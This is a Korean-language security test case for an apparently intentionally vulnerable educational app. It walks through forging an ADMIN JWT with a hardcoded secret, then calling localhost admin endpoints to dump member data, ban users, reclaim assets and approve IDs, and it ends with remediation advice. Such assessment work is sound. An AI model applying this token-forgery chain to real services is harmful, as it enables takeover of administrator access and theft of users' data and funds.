================================================================================
[VCE-ADMIN-03] JWT 위조 + RBAC 우회 → 관리자 권한 상승 전체 시나리오
도메인: admin (관리자)
================================================================================

## 1. 진단 항목 개요

- **항목명**: JWT 위조를 통한 ADMIN 권한 상승 (End-to-End 시나리오)
- **번호**: ADMIN-03
- **위험도**: Critical
- **OWASP**: A01:2021 + A07:2021

## 2. 대상 기능 & 엔드포인트

| 항목 | 내용 |
|------|------|
| 대상 | /api/admin/** 전체 |
| HTTP 메서드 | GET, PATCH, POST |
| 선행 조건 | JWT 시크릿 키 확보 (JwtTokenProvider.java:18) |

## 3. 취약점 원리 (Why this works)

두 취약점의 연계 공격:
1. `JwtTokenProvider.java:18` 하드코딩 시크릿 키로 ADMIN JWT 위조
2. 위조된 JWT로 `/api/admin/**` 전체 기능 접근

공격자가 소스코드, 역컴파일, 오류 메시지 등으로 시크릿 키를 획득하면
완전한 관리자 접근이 가능하다.

## 4. 테스트 절차 (Step-by-step) — 완전한 공격 시나리오

### Step 1. 시크릿 키로 ADMIN JWT 생성

```python
import jwt, time

SECRET = "vce_secret_key_for_educational_purpose_only_do_not_use_in_production"

token = jwt.encode({
    "sub": "attacker@evil.com",
    "role": "ADMIN",
    "iat": int(time.time()),
    "exp": int(time.time()) + 86400 * 365
}, SECRET, algorithm="HS256")

print(f"Authorization: Bearer {token}")
```

---

### Step 2. 전체 회원 목록 조회

```
GET /api/admin/members HTTP/1.1
Host: localhost:8080
Authorization: Bearer <위조_ADMIN_JWT>
```

→ 모든 회원의 이메일, 계좌번호, 신분증 상태 등 노출

---

### Step 3. 특정 회원 계정 차단

```
PATCH /api/admin/members/1/status HTTP/1.1
Host: localhost:8080
Authorization: Bearer <위조_ADMIN_JWT>
Content-Type: application/json

{"status": "BANNED"}
```

---

### Step 4. 자산 회수

```
PATCH /api/admin/members/1/assets/reclaim HTTP/1.1
Host: localhost:8080
Authorization: Bearer <위조_ADMIN_JWT>
Content-Type: application/json

{"assetType": "KRW", "amount": 1000000}
```

---

### Step 5. 신분증 자동 승인

```
PATCH /api/admin/members/1/approve-id HTTP/1.1
Host: localhost:8080
Authorization: Bearer <위조_ADMIN_JWT>
```

---

### Step 6. 전체 거래/주문 조회

```
GET /api/admin/transactions HTTP/1.1
GET /api/admin/orders HTTP/1.1
GET /api/admin/stats HTTP/1.1
```

## 5. 취약 여부 판단 기준

✅ **취약 (Vulnerable)**:
- 위조 JWT로 /api/admin/members → HTTP 200 + 회원 목록 반환
- 자산 회수, 계정 차단, 신분증 승인 등 관리자 기능 전체 작동

✗ **안전 (Not Vulnerable)**:
- 시크릿 키가 환경변수에서 로드되어 추측 불가
- 위조 JWT → HTTP 401 Unauthorized

## 6. 예상 취약 포인트 (코드 위치)

- `JwtTokenProvider.java:18` — SECRET_KEY 하드코딩
- `SecurityConfig.java` — JWT 검증 필터

## 7. 권고 조치

- JWT 시크릿 키 환경변수화 (최우선)
- 관리자 계정 로그인 시 2FA(이중 인증) 적용
- 관리자 API 접근 로그 및 알림 설정
- IP 화이트리스트로 관리자 API 접근 제한
